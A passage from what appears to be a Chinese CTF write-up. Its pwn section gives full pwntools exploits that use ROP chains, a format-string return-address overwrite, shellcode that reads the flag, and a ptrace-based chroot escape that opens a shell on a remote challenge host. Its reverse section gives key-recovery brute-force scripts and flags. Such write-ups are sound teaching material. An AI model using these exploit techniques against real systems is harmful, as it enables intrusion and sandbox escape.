  payload += p64(0) + p64(pop_rdi) + p64(0x100000) + p64(pop_rsi) + p64(0x1000)
  payload += p64(pop_rdx_pop_r12) + p64(7) + p64(0) + p64(pop_rax) + p64(10) + p64(syscall)
  payload += p64(pp_ret)
  payload += p64(0x100060) + p64(leave_ret) + p64(0x1000a8)

  shellcode = '''
    mov rdi,0x1000f7
    xor rsi,rsi
    mov rax,2
    syscall
    mov rdi,5
    mov rsi,0x100000
    mov rdx,0x80
    mov rax,0
    syscall
    mov rdi,1
    mov rsi,0x100000
    mov rdx,0x80
    mov rax,1
    syscall
  '''
  sla('> ','5')
  payload += asm(shellcode) + 'flag\x00'
  sla('place:',payload)

  #raw_input()
  sla('> ',str(0x666))
  p.interactive()
hack()

```
### ChildShell
格式化字符串 + chroot 逃逸
子进程用了 bss 段作为栈空间，所以直接格式化字符串修改返回地址劫持控制流
沙箱逃逸直接使用 ptrace 去修改父进程的代码段就可以了（修改 wait 后的代码）
swings tql！
```=python
from pwn import *
from ctypes import *
import os
from Crypto.Cipher import AES
from binascii import b2a_hex, a2b_hex
import struct
#import roputils as rop

remote_addr = "110.80.136.39"
remote_port = 17221
#110.80.136.39 11271
uselibc = 2 #0 for no,1 for i386,2 for x64
local = 0
haslibc = 0
atta = 0

pc = './chall'
pwn_elf = ELF(pc)

def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
    print "haha2"
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('/tmp/pwn', os.F_OK): 
              os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    print path
    return ELF(path)


def pack_file_64(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0,
              _mode = 0):
    struct = p64(_flags) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    struct = struct.ljust(0x88, "\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xc0,"\x00")
    struct += p64(_mode)
    struct = struct.ljust(0xd8, "\x00")
    return struct


if uselibc == 2:
  context.arch = "amd64"
else:
  context.arch = "i386"

if uselibc ==2 and haslibc == 0:
  libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
else:
  if uselibc == 1 and haslibc == 0:
    libc = ELF('/lib/i386-linux-gnu/libc-2.27.so')
  else:
    libc = ELF('./libc.so.6')

if local == 1:
  if haslibc:
    #elf = change_ld(pc, './ld.so')
    #p = elf.process(env={'LD_PRELOAD':'./libc.so.6'})
    p = process(pc,env={'LD_PRELOAD':'./libc.so.6'}) 
  else:
    p = process(pc)
elif local == 0:
  p = remote(remote_addr,remote_port)
  if haslibc:
    libc = ELF('./libc.so.6')

context.log_level = True

if local:
  if atta:
    #gdb.attach(p,'b *0x00000000001142F6 + 0x555555554000\n b*0x00000000001147D2 + 0x555555554000\n b*0x000000000011432B+0x555555554000')
    #gdb.attach(p,'b *0x00000000001147A3+0x555555554000\n b*0x00000000001147B5+0x555555554000')
    p = gdb.debug(pc,'set follow-exec-mode new\nset follow-fork-mode child\nb *0x400d56\nb *0x400d75\n')


def sla(a,b):
  p.sendlineafter(a,b)

def sa(a,b):
  p.sendafter(a,b)

def ru(a):
  return p.recvuntil(a)

def rl():
  return p.recvline()

def rv(a):
  return p.recv(a)

def sn(a):
  p.send(a)

def sl(a):
  p.sendline(a)

def lg(s,addr):
  print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def hack():
  raw_input()
  
  #fake_stack = 0x6ed0c8
  #push_rbp_ret = 0x00000000004c9c36
  #add_rsp_8 = 0x00000000004002dd
  #add_rsp_18 = 0x0000000000401825

  pop_rdi_ret = 0x0000000000401a36
  read_addr = 0x00000000004009AE
  #leave_ret = 0x0000000000400a4c
  #ret = 0x0000000000400DFD
  stack_ret = 0x7ce6b8

  offset = 22
  #payload = '%12c' + '%' + str(offset) + '$hhn'
  #payload += '%96c' + '%' + str(offset + 1) + '$hhn'
  payload = '%' + str(0x40) + 'c' + '%' + str(offset) + '$hhn'
  payload += '%' + str(0x1a36-0x40) + 'c' + '%' + str(offset+1) + '$hn'

  payload += '%' + str(0x7c-0x36) + 'c' + '%' + str(offset+2) + '$hhn'
  payload += '%' + str(0xe6d0-0x1a7c) + 'c' + '%' + str(offset+3) + '$hn'

  payload += '%' + str(0x140-0xd0) + 'c' + '%' + str(offset+4) + '$hhn'
  payload += '%' + str(0x109ae-0xe740) + 'c' + '%' + str(offset+5) + '$hn'


  payload = payload.ljust(0x70,'\x00')
  payload += p64(stack_ret + 2)
  payload += p64(stack_ret)
  payload += p64(stack_ret + 8 + 2)
  payload += p64(stack_ret + 8)
  payload += p64(stack_ret + 0x10 + 2)
  payload += p64(stack_ret + 0x10)


  #payload += p64(fake_stack + 2)
  #payload += p64(fake_stack)

  #payload += p64(fake_stack + 0x10 + 2)
  #payload += p64(fake_stack + 0x10)
  
  #payload += p64(fake_stack + 0x20 + 2)
  #payload += p64(fake_stack + 0x20)

  #payload += p64(fake_stack + 0x28 + 2)
  #payload += p64(fake_stack + 0x28)

  sla('echo back.\n',payload)

  pop_rsi_ret = 0x0000000000401b57
  syscall = 0x0000000000468bf5
  pop_rdx_ret = 0x0000000000443f96
  pop_rax_pop_rdx_pop_rbx_ret = 0x0000000000479976
  pop_rdi_ret = 0x0000000000401a36
  sub_eax_edx = 0x00000000004137ad
  payload = p64(pop_rdi_ret) + p64(0x7ce000)
  payload += p64(pop_rsi_ret) + p64(0x1000)
  payload += p64(pop_rax_pop_rdx_pop_rbx_ret) + p64(17) + p64(7) + p64(0)
  payload += p64(sub_eax_edx)
  payload += p64(syscall)

  shellcode = '''
    xor rdi,rdi
    xor rax,rax
    mov rsi,0x7ce728
    mov rdx,0x200
    syscall
  '''



  payload += p64(0x7ce728)
  payload += asm(shellcode)
  sl(payload)
  

  shellcode = '''
    xor rax,rax
    mov al,110
    syscall

    mov r15,rax
    mov rsi,rax
    mov di,0x10
    xor r10,r10
    mov rdx,r10
    call ptrace

    xor rsi,rsi
    mov rdi,r15
    call wait

    call getaddr
    xor r12,r12
    mov rbx,r12
    mov rdx,0x0000000000400C8C
    mov r14,rax

write:
    mov rdi,5
    mov r10,qword ptr [r14]
    mov rsi,r15
    call ptrace

    inc r12
    cmp r12,5
    add rdx,8
    add r14,8
    jnz write

    mov di,17
    mov rsi,r15
    xor rdx,rdx
    mov r10,rdx
    call ptrace

    xor rax,rax
    mov rdi,rax
    mov al,60
    syscall
ptrace:
    xor rax,rax
    mov al,0x65
    syscall
    ret

wait:

    xor     r10d, r10d
    movsxd  rdx, edx
    movsxd  rdi, edi
    mov     eax, 0x3D
    syscall
    ret

getaddr:
    lea rax,[rip+1]
    ret
  '''

  # shellcode = '''
  #   mov rdi,4
  #   mov rax,81
  #   syscall
  #   mov rdi,0x7ce7a8
  #   mov rax,80
  #   syscall
  # '''
  sl('\x90'*0x30 + asm(shellcode) + asm(shellcraft.sh()))
  
  #sl('\x00'*0x41000)
  p.interactive()
hack()

```
## Reverse
### babye
在IDA里面静态将key值算出来
然后写exp：
```
# 0e933bfe-1a6f-4cf0-a89c-615aef9e3620
keys = 0x64e2fbe3  
key_tmp = [0x64e2711f , 0x64e26d0b, 0x64e2fa1b, 0x64e2d3a4]
xor_value = [0x1bc3 , 0xa74 , 0xce4f , 0xe52 , 0xd34b , 0x7069 , 0x8a27 , 0x295a , 0x630e , 0xfe27 , 0x18a7 , 0x5f86 , 0xa747 , 0x839f , 0x41ff , 0x1bc3 , 0xbf9e , 0xfa2]
dest_value = [0xd910 , 0xc2f2 , 0x6c9 , 0x97d7 , 0xc379 , 0x3747 , 0x9d5b , 0x7571 , 0x2363 , 0xf21c , 0x4d81 , 0xbee , 0x686a , 0x18b5 , 0xde81 , 0x87e1 , 0x5c09 , 0x1fba ]
blocks = ""

for k in range(4):
    for i in range(27 , 128):
        for j in range(27 , 128):
            a = i
            b = j
            v19 = ((a | (b << 8)) ^ xor_value[0 + k * 4 ])
            dest1 = (v19 ^ keys) & 0xffff
            if dest1 == dest_value[0 + k * 4]:
                # print hex((v19 ^ 0x51e3) & 0xff)
                keys1 = v19
                s0 = chr(a)
                s2 = chr(b)

    for i in range(27 , 128):
        for j in range(27 , 128):
            a = i
            b = j
            v19 = ((a | (b << 8)) ^ xor_value[1 + k * 4])
            dest1 = (v19 ^ keys) & 0xffff
            if dest1 == dest_value[1 + k * 4]:
                # print hex((v19 ^ 0x51e3) & 0xff)
                keys2 = v19
                s1 = chr(a)
                s3 = chr(b)

    for i in range(27 , 128):
        for j in range(27 , 128):
            a = i
            b = j
            v19 = ((a | (b << 8)) ^ xor_value[2 + k * 4])
            dest1 = (v19 ^ keys) & 0xffff
            if dest1 == dest_value[2 + k * 4]:
                # print hex((v19 ^ 0x51e3) & 0xff)
                print hex(v19)
                keys3 = v19
                s7 = chr(a)
                s4 = chr(b)

    for i in range(27 , 128):
        for j in range(27 , 128):
            a = i
            b = j
            v19 = ((a | (b << 8)) ^ xor_value[3 + k * 4])
            dest1 = (v19 ^ keys) & 0xffff
            if dest1 == dest_value[3 + k * 4]:
                # print hex((v19 ^ 0x51e3) & 0xff)
                print hex(v19)
                keys4 = v19
                s5 = chr(b)
                s6 = chr(a)
    blocks += s0 + s1 + s2 + s3 + s4 + s5 + s6 + s7
    # print blocks
    print k
    keys = key_tmp[k]
    # raw_input()
print blocks


# last 4 bytes
for i in range(27 , 128):
    for j in range(27 , 128):
        a = i
        b = j
        v19 = ((a | (b << 8)) ^ 0xFFFFBF9E)
        dest1 = (v19 ^ keys) & 0xffff
        if dest1 == 0x5c09: # 
            keys4 = v19
            s5 = chr(b)
            s6 = chr(a)
            print chr(a) , chr(b) 


for i in range(27 , 128):
    for j in range(27 , 128):
        a = i
        b = j
        v19 = ((a | (b << 8)) ^ 0xFA2C)
        dest1 = (v19 ^ keys) & 0xffff
        if dest1 == 0x1fba:
            # print hex((v19 ^ 0x51e3) & 0xff)
            # print hex(v19)
            keys4 = v19
            s5 = chr(b)
            s6 = chr(a)
            print chr(a) , chr(b) 

```
flag：0e933bfe-1a6f-4cf0-a89c-615aef9e3620
### Easyydre

flag part 1

```python
#!/usr/bin/env python3

import struct

_a = \
"""
0x55576550  0x00005555  0x8c27d4d4  0x644d42bd
0x6dac4460  0xd39b649b  0x00000000  0x00000000
0x00000000  0x00000000  0x00000000  0x00000000
0x00000000  0x00000000  0x00000000  0x00000000
0x00000000  0x00000000  0x00000000  0x00000000
0x00000000  0x00000000  0x00000000  0x00000000
0x00000000  0x00000000  0x00000000  0x00000000
0x00000000  0x00000000  0x00000000  0x00000000
0x00000000  0x00000000  0x00000000  0x00000000
0x00000000  0x00000000  0x00000000  0x00000000
0x00000000  0x00000000  0x00000000  0x00000000
0x00000000  0x00000000  0x00000004  0x000000ac
0x000000bb  0x00000031  0x00000088  0x0000002b
0x00000029  0x0000009a  0x00000020  0x00000078
0x00000098  0x0000005e  0x000000bb  0x000000b7
0x00000049  0x00000079  0x000000a9  0x00000036
0x00000017  0x00000019  0x00000084  0x0000007e
0x000000cd  0x00000089  0x000000e8  0x000000c8
0x0000009e  0x0000007b  0x0000003f  0x00000053
0x0000007b  0x00000021  0x00000031  0x000000b7
0x000000a4  0x00000028  0x00000074  0x00000068
0x000000c0  0x000000ba  0x000000cc  0x0000009c
0x0000003a  0x00000091  0x00000008  0x0000006d
0x000000b8  0x000000da  0x00000090  0x000000af
0x00000099  0x00000038  0x00000046  0x000000e9
0x000000e9  0x00000040  0x000000f3  0x0000002f
0x000000b8  0x00000099  0x000000c6  0x00000080
0x00000021  0x00000057  0x0000002e  0x00000029
0x000000eb  0x00000021  0x00000008  0x0000004f
0x00000045  0x00000080  0x00000049  0x000000ce
0x00000098  0x0000002f  0x0000001f  0x0000003b
0x00000009  0x00000035  0x00000100  0x000000d6
0x000000dd  0x00000090  0x00000088  0x000000c0
0x000000a2  0x00000053  0x00000036  0x0000005d
0x0000008d  0x000000ce  0x000000f0  0x000000ef
0x000000f5  0x00000022  0x00000005  0x00000067
0x000000c5  0x000000b7  0x000000fb  0x00000004
0x00000019  0x00000022  0x00000033  0x000000af
0x000000c2  0x000000a5  0x000000d3  0x00000020
0x000000f7  0x000000f3  0x0000003e  0x0000006d
0x00000041  0x000000e1  0x00000082  0x00000100
0x00000075  0x00000034  0x000000dc  0x00000031
0x000000a8  0x0000009c  0x00000040  0x0000006a
0x00000062  0x000000bb  0x00000075  0x000000be
0x00000090  0x00000014  0x000000ae  0x00000060
0x00000080  0x00000009  0x0000003b  0x0000004b
0x0000003b  0x000000f1  0x00000040  0x00000067
0x00000025  0x00000018  0x000000d5  0x000000bd
0x00000035  0x000000a2  0x00000012  0x000000e0
0x00000008  0x00000070  0x00000037  0x00000058
0x00000044  0x000000f0  0x00000008  0x00000007
0x00000067  0x0000009f  0x00000017  0x000000ca
0x000000ca  0x000000b2  0x0000006a  0x000000bf
0x00000040  0x000000e3  0x00000094  0x000000c4
0x00000048  0x00000080  0x0000009c  0x00000068
0x000000c0  0x0000002a  0x0000006e  0x00000037
0x0000008c  0x0000002f  0x000000dd  0x000000ae
0x0000006e  0x00000005  0x0000003d  0x0000001d
0x0000007a  0x000000c6  0x0000001f  0x000000ca
0x000000c0  0x000000ba  0x0000009a  0x0000006d
0x000000fe  0x000000ec  0x000000df  0x000000dd
0x00000074  0x00000065  0x00000066  0x00000007
0x000000fd  0x00000074  0x00000067  0x00000020
0x000000d0  0x00000072  0x00000075  0x000000d9
0x000000ff  0x0000000e  0x000000e9  0x0000009f
0x00000067  0x0000006b  0x0000006a  0x00000090
0x00000069  0x000000df  0x000000b9  0x000000f0
0x000000b1  0x0000007d  0x00000056  0x000000fe
0x00000029  0x000000bc  0x0000006b  0x0000009c
0x0000006d  0x0000000d  0x00000003  0x000000bc
0x00000063  0x00000056  0x0000008b  0x000000a8
0x00000061  0x0000000a  0x000000a6  0x0000001d
0x000000f2  0x000000cf  0x00000010  0x00000006
0x0000000c  0x0000000a  0x00000063  0x0000008b
0x000000a6  0x00000011  0x000000b4  0x000000ec
0x00000078  0x00000010  0x00000014  0x00000043
0x00000069  0x0000003c  0x00000099  0x00000080
0x00000017  0x000000cd  0x00000047  0x000000ee
0x00000026  0x000000fd  0x00000062  0x0000009a
0x000000f6  0x00000097  0x00000074  0x00000006
0x0000004d  0x000000d0  0x00000065  0x00000063
0x00000020  0x0000003e  0x000000e3  0x0000006d
0x0000000e  0x000000c3  0x000000da  0x000000c8
0x00000020  0x0000000b  0x0000001d  0x00000092
0x0000001d  0x0000002d  0x00000088  0x000000aa
0x000000d2  0x0000006d  0x0000000f  0x0000001e
0x00000051  0x00000073  0x00000088  0x00000050
0x00000004  0x0000004a  0x000000b0  0x0000005a
0x00000030  0x00000022  0x000000f6  0x00000050
0x0000009b  0x0000005a  0x00000082  0x00000070
0x000000af  0x00000093  0x0000008a  0x00000100
0x00000044  0x0000007b  0x000000c3  0x0000006f
0x0000003f  0x0000005d  0x00000069  0x00000016
0x00000070  0x0000000a  0x00000059  0x000000e0
0x000000cb  0x00000022  0x00000011  0x000000d1
0x0000006a  0x000000d5  0x00000014  0x00000043
0x00000042  0x000000e0  0x0000005f  0x000000c4
0x00000008  0x000000d3  0x0000000c  0x000000a8
0x00000031  0x00000004  0x0000002d  0x00000078
0x000000ba  0x0000001e  0x000000cf  0x00000058
0x000000cb  0x00000029  0x00000013  0x000000c0
0x00000027  0x00000097  0x000000f6  0x0000003c
0x00000086  0x0000004c  0x000000c7  0x00000007
0x000000f7  0x0000001e  0x000000ef  0x000000d3
0x000000ac  0x000000dc  0x0000005f  0x00000084
0x00000002  0x000000dc  0x00000081  0x0000008c
0x0000002c  0x000000c4  0x000000ed  0x00000037
0x0000001e  0x00000066  0x000000ce  0x00000037
0x000000c5  0x00000093  0x0000000b  0x0000009a
0x000000b7  0x00000006  0x0000001b  0x0000007e
0x000000b6  0x00000035  0x00000064  0x000000dd
0x0000003e  0x0000004f  0x0000006a  0x000000c2
0x0000008b  0x000000ed  0x000000d7  0x000000e2
0x00000088  0x000000bb  0x00000019  0x000000c8
0x00000026  0x000000c0  0x0000005a  0x000000ef
0x000000b1  0x0000000c  0x000000a8  0x0000001a
0x00000052  0x00000097  0x000000e0  0x00000087
0x00000041  0x000000bc  0x000000de  0x0000008d
0x0000009e  0x000000a2  0x00000007  0x0000004d
0x00000069  0x00000097  0x000000c4  0x0000000f
0x00000068  0x0000008b  0x0000004d  0x0000000d
0x00000021  0x0000003f  0x00000036  0x00000091
0x00000054  0x000000e0  0x000000fe  0x00000011
0x00000003  0x000000d4  0x00000052  0x0000008d
0x0000001b  0x000000fc  0x00000085  0x000000ce
0x000000ae  0x000000e9  0x00000096  0x00000080
0x0000009b  0x000000d6  0x000000a1  0x000000c2
0x000000a2  0x000000e0  0x00000012  0x0000001f
0x00000100  0x00000015  0x0000007e  0x00000086
0x000000c2  0x000000ac  0x00000036  0x00000057
0x0000009a  0x0000001c  0x00000027  0x0000003f
0x0000005a  0x0000005c  0x000000e0  0x00000090
0x0000000b  0x00000013  0x00000035  0x000000f9
0x00000076  0x0000009b  0x000000b6  0x00000085
0x000000d5  0x000000ae  0x00000054  0x00000056
0x0000006f  0x000000a4  0x00000045  0x000000b4
0x0000009e  0x000000bd  0x000000d1  0x000000c9
0x0000006e  0x00000064  0x0000000d  0x00000037
0x00000036  0x000000e3  0x0000004c  0x00000022
0x00000013  0x000000c9  0x000000ea  0x0000000f
0x000000c3  0x00000074  0x000000bc  0x0000001e
0x00000030  0x00000095  0x000000fa  0x00000046
0x0000005c  0x00000039  0x000000c8  0x00000049
0x000000dd  0x0000008d  0x00000044  0x000000b5
0x000000c4  0x00000046  0x000000a7  0x000000e7
0x0000008d  0x00000002  0x000000c2  0x00000096
0x0000006b  0x00000096  0x00000097  0x00000046
0x00000043  0x000000cc  0x000000d8  0x00000022
0x000000c6  0x00000062  0x00000039  0x0000009f
0x000000b2  0x000000e2  0x00000047  0x00000039
0x000000ef  0x0000000b  0x00000031  0x0000006a
0x000000bf  0x00000039  0x000000c6  0x0000000a
0x0000007f  0x00000038  0x0000000e  0x000000ad
0x0000008f  0x000000a4  0x00000092  0x0000000d
0x00000043  0x0000006d  0x0000007b  0x00000051
0x000000fe  0x00000074  0x000000bb  0x0000005c
0x00000052  0x0000001c  0x00000098  0x000000a8
0x000000b9  0x00000035  0x000000b2  0x00000016
0x000000fc  0x00000008  0x00000057  0x0000001e
0x0000009d  0x000000e2  0x00000076  0x00000096
0x000000d3  0x00000062  0x0000009e  0x000000d3
0x00000063  0x0000002d  0x0000004c  0x0000009d
0x000000b9  0x0000002f  0x00000059  0x00000094
0x00000094  0x00000050  0x00000023  0x000000f1
0x00000003  0x0000005b  0x00000079  0x00000078
0x00000037  0x00000015  0x000000c1  0x0000000d
0x0000000c  0x000000c7  0x00000005  0x00000055
0x00000070  0x00000066  0x000000fb  0x0000004a
0x0000005d  0x00000081  0x000000af  0x000000ec
0x000000c3  0x00000060  0x00000024  0x000000c2
0x00000096  0x0000000b  0x00000062  0x00000037
0x0000001c  0x0000003b  0x000000e7  0x00000088
0x000000fa  0x000000fd  0x000000a5  0x000000b1
0x000000a7  0x000000ae  0x000000bb  0x000000e3
0x00000054  0x00000077  0x00000017  0x00000010
0x0000005d  0x00000092  0x00000001  0x00000064
0x00000010  0x00000006  0x00000004  0x0000009e
0x00000083  0x000000eb  0x0000002c  0x000000fc
0x00000043  0x000000f1  0x00000030  0x000000de
0x00000003  0x0000006f  0x00000036  0x0000009e
0x00000019  0x000000ad  0x000000ff  0x000000b5
0x000000ec  0x000000bc  0x000000f0  0x000000a6
0x000000e4  0x000000f5  0x00000039  0x000000d8
0x000000ff  0x0000005c  0x00000083  0x000000df
0x000000d1  0x00000005  0x00000073  0x0000004d
0x00000063  0x000000af  0x00000022  0x0000001e
0x000000bc  0x00000058  0x000000af  0x00000004
0x000000bc  0x000000f9  0x00000068  0x00000050
0x000000a4  0x000000f8  0x000000a6  0x00000076
0x000000d8  0x00000081  0x0000000f  0x00000085
0x0000005d  0x00000088  0x00000019  0x000000e6
0x00000077  0x000000a4  0x0000002d  0x00000013
0x000000f8  0x000000cf  0x000000f4  0x00000016
0x000000a9  0x000000e2  0x0000007f  0x00000023
0x00000065  0x00000080  0x0000005e  0x00000052
0x000000b8  0x00000012  0x000000de  0x0000000e
0x00000050  0x000000e9  0x0000002d  0x00000095
0x00000054  0x0000000d  0x000000fd  0x00000059
0x0000003c  0x0000002c  0x000000e7  0x00000019
0x000000b3  0x0000001b  0x000000ae  0x000000d3
0x0000009f  0x0000007f  0x000000d6  0x00000039
0x0000001f  0x000000df  0x000000e1  0x00000004
0x0000003b  0x000000ab  0x000000fb  0x000000ec
0x000000c8  0x000000db  0x0000002c  0x00000070
0x000000f8  0x00000087  0x00000061  0x00000054
0x00000033  0x00000075  0x0000008b  0x00000066
0x000000f6  0x00000058  0x00000039  0x0000009f
0x0000004e  0x00000066  0x000000b2  0x000000e2
0x00000004  0x000000f9  0x0000006c  0x00000044
0x00000064  0x00000076  0x00000063  0x00000077
0x000000e8  0x00000008  0x0000003b  0x0000005b
0x0000001e  0x0000007f  0x00000068  0x00000045
0x0000002f  0x00000093  0x00000054  0x000000b2
0x00000038  0x0000004f  0x000000b7  0x000000ef
0x0000008f  0x000000aa  0x0000005c  0x00000098
0x000000af  0x000000cb  0x00000002  0x0000004c
0x000000ca  0x0000008b  0x00000077  0x0000001c
0x00000015  0x0000002b  0x00000063  0x0000008d
0x000000c0  0x0000009d  0x00000042  0x0000015e
0x000000a4  0x000000fe  0x00000011  0x0000001d
0x00000021  0x0000009c  0x0000000a  0x00000082
0x0000009b  0x00000005  0x00000021  0x00000061
0x00000093  0x0000001c  0x000000bf  0x00000071
0x000000b1  0x000000aa  0x0000010a  0x00000068
0x000000cd  0x000000a0  0x00000038  0x000000b3
0x00000013  0x00000026  0x0000008e  0x00000083
0x0000000a  0x000000ae  0x000000f4  0x00000055
0x00000046  0x00000059  0x000000f7  0x000000ea
0x00000003  0x0000009b  0x000000f2  0x000000e4
0x000000d8  0x00000002  0x00000021  0x000000bc
0x00000034  0x00000015  0x00000010  0x00000053
0x00000008  0x0000000c  0x000000fe  0x000000f4
0x000000f6  0x000000eb  0x000000ed  0x000001bb
0x00000093  0x000000da  0x00000035  0x00000049
0x00000010  0x000000b4  0x0000006f  0x000000ae
0x000000a8  0x00000078  0x000000b6  0x000000be
0x00000025  0x000000a8  0x00000040  0x0000008c
0x000000a8  0x00000014  0x00000038  0x00000021
0x0000002b  0x0000007d  0x000000ca  0x000000cb
0x00000053  0x00000064  0x0000005e  0x000000b5
0x000000f3  0x000000ed  0x0000005a  0x000000a8
0x00000019  0x00000075  0x000000af  0x000000ff
0x00000013  0x000000f1  0x00000097  0x000000ba
0x00000064  0x0000001f  0x00000094  0x000000b8
0x00000063  0x000000a6  0x000000f7  0x000000eb
0x00000027  0x00000083  0x0000007a  0x000000c6
0x00000011  0x0000007c  0x000000af  0x000000ae
0x00000018  0x0000008e  0x000000fc  0x0000003c
0x00000002  0x000000e4  0x0000003d  0x00000013
0x000000a2  0x000000ba  0x0000002a  0x0000006d
0x000000f8  0x0000000c  0x00000023  0x000000b3
0x00000024  0x000000c6  0x0000002d  0x000000ab
0x000000ee  0x0000007a  0x00000047  0x000000b8
0x000000be  0x00000072  0x000000ee  0x000000db
0x00000067  0x0000006b  0x000000c0  0x00000014
0x0000005f  0x000000ee  0x00000040  0x00000014
0x00000136  0x0000005c  0x000000c6  0x000000c2
0x00000077  0x00000098  0x0000000e  0x00000090
0x00000046  0x00000051  0x00000078  0x00000078
0x000000e7  0x00000083  0x000000e1  0x00000009
0x000000e5  0x0000000c  0x0000007f  0x00000066
0x00000038  0x000000e5  0x0000002d  0x000000d9
0x0000007b  0x000000dd  0x000000fd  0x00000089
0x0000007b  0x00000031  0x00000055  0x0000008a
0x0000008e  0x000000e1  0x0000002d  0x0000002a
0x00000030  0x00000091  0x000000f6  0x00000056
0x000000f4  0x00000067  0x000000d4  0x000000e9
0x0000009a  0x0000004a  0x35442823  0x989ed6e7
0xb8fb8309  0x05ef44c6  0xa3ddf747  0x6b8ef034
0x2f901751  0x39db4c86  0x352865a2  0xa5ba1583
0xf01605cf  0x8e442a9c  0x08e2f17e  0x01bfad73
0x011f679b  0x011d0cac  0x00b92d7a  0x039a0cc6
0x09a2023d  0x0cb8a676  0x0588b770  0x08775067
0x0e197e2f  0x060e5aa0  0x0da9c7a3  0x046d6c91
0x036e30f7  0x0dc5a4c9  0x06cd556a  0x02dac8af
0x08acf8cb  0x0be7ef6f  0x0648048d  0x0ff310f6
0x03e1e240  0x0241a624  0x0723bde2  0x033d53a7
0x00d479ad  0x00f0a3c0  0x03633ed7  0x03b3ee92
0x015656e9  0x02d78859  0x0d790f9e  0x0eeadaf6
0x0df0d5b9  0x026a1b7c  0x0abc4739  0x0fc5b7ba
0x03967947  0x0aff86fa  0x01d771f3  0x0d1be16b
0x0769ad2d  0x052a94d7  0x01527169  0x05ce25ea
0x0408870b  0x0c2b2dd6  0x066123f7  0x0abc0030
0x0f47f07a  0x088857f0  0x01f7a340  0x04c40c1e
0x0b1009f1  0x00183249  0x08a17fe7  0x0261c9cf
0x055980af  0x0574bc83  0x0d61a6ea  0x0a7b793c
0x0f0189c1  0x0c5a823c  0x059b8e01  0x0e974526
0x0f6c4646  0x0632a1f6  0x0d021dab  0x049682d6
0x00be8011  0x0a0b9da1  0x0a51b86c  0x0aac81ad
0x08f12160  0x00677a53  0x09fec32c  0x07647ed3
0x0fee4e95  0x0ba43234  0x0ca00a70  0x05a8f630
0x0864f8d1  0x022e0abd  0x04bcd429  0x0ff2294e
0x0e771cd6  0x0a112d44  0x0588b8ee  0x0a90a6c5
0x0800076c  0x0acbaf63  0x0f03e9df  0x0b0ba40a
0x0ad32a4d  0x08cbbd42
"""
_a = [int(x[2:], 16) for x in _a.split()]

def lookup(a, x):
    y = 0
    for i in range(4):
        t = (x >> (8*i)) & 0xff
        yi = a[814 + t] ^ a[558 + t] ^ a[302 + t] ^ a[46 + t]
        y |= yi << (8*i)
    return y

def ror(x, y):
    return (x >> y) | ((x << (32-y)) & 0xffffffff)

def rol(x, y):
    return ((x << y) & 0xffffffff) | (x >> (32-y))

def hahaha(a):
    buf = [0] * 36
    for i in range(4):
        buf[i] = a[1078+i] ^ a[1074+i] ^ a[1070+i] ^ a[2+i]
    for i in range(32):
        t = a[1146+i] ^ a[1114+i] ^ a[1082+i]
        t = (t << 4) & 0xffffffff
        if (i & 3) == 0:
            t |= 5
        elif (i & 3) == 1:
            t |= 1
        elif (i & 3) == 2:
            t |= 0xd
        elif (i & 3) == 3:
            t |= 9
        v = lookup(a, t ^ buf[i+1] ^ buf[i+2] ^ buf[i+3])
        v = ror(v, 9) ^ rol(v, 13) ^ v
        v ^= buf[i]
        buf[i+4] = v
        a[i+6] = v

def get_answer1(x):
    global _a
    a = _a[:]
    x = x[:16].ljust(16, '\x00')
    for i in range(4):
        a[42 + i] = struct.unpack('<i', x[i*4:i*4+4].encode())[0]
    hahaha(a)
    buf = [0] * 36
    for i in range(4):
        buf[i] = a[42+i]
    for i in range(32):
        v = buf[i+1] ^ buf[i+2] ^ buf[i+3] ^ a[i+6]
        v = lookup(a, v)
        v = ror(v, 14) ^ rol(v, 10) ^ rol(v, 2) ^ ror(v, 8) ^ v
        buf[i+4] = v ^ buf[i]
    y = buf[32:36]
    y = y[::-1]
    return y

def solve():
    global _a
    a = _a[:]
    hahaha(a)
    buf = [0] * 36
    buf[32:] = [0x6BC6B8F3, 0x0A23E4711, 0x1D43D3E5, 0x4BAB4224][::-1]
    for i in range(31, -1, -1):
        v = buf[i+1] ^ buf[i+2] ^ buf[i+3] ^ a[i+6]
        v = lookup(a, v)
        v = ror(v, 14) ^ rol(v, 10) ^ rol(v, 2) ^ ror(v, 8) ^ v
        buf[i] = buf[i+4] ^ v
    return buf[:4]

s = solve()
flag1 = ""
for i in range(4):
    for j in range(4):
        flag1 += chr((s[i] >> (8*j)) & 0xff)
print(flag1) # aac1b72f-6846-40

ans1 = get_answer1(flag1)
assert ans1 == [0x6BC6B8F3, 0x0A23E4711, 0x1D43D3E5, 0x4BAB4224]
```

part2

```python
#!/usr/bin/env python3
import struct

flag_part1 = '???' * 16

